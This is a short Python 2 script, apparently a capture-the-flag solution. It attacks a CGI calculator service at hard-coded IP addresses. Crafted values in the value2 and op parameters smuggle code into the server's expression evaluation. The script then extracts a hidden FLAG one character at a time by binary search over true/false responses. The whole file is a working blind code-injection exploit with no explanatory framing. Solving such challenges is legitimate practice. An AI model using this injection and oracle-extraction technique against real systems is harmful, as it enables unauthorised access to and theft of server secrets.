import requests, re


def calc(v1, v2, op, s):
    u = "http://178.128.96.203/cgi-bin/server.py?"
    u = "http://206.189.223.3/cgi-bin/server.py?"
    payload = dict(value1=v1, value2=v2, op=op, source=s)
    # print payload
    r = requests.get(u, params=payload)
    print r.content
    # print r.url
    res = re.findall("<pre>\n>>>>([\s\S]*)\n>>> <\/pre>",
                     r.content)[0].split('\n')[1]
    assert (res != 'Invalid')
    return res == 'True'
    # print r.content


def check(mid):
    s = flag + chr(mid)
    return calc(v1, v2, op, s)


def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None):
    assert (lo >= 0)
    if hi == None: hi = len(seq)
    while lo < hi:
        mid = (lo + hi) // 2
        # print lo, mid, hi, "\t",
        if check(seq[mid]): hi = mid
        else: lo = mid + 1
    return seq[lo]


flag = ''
v1, v2, op, s = 'x', "+FLAG<value1+source#", "+'", ''

while (1):
    flag += chr(bin_search() - 1)
    print flag
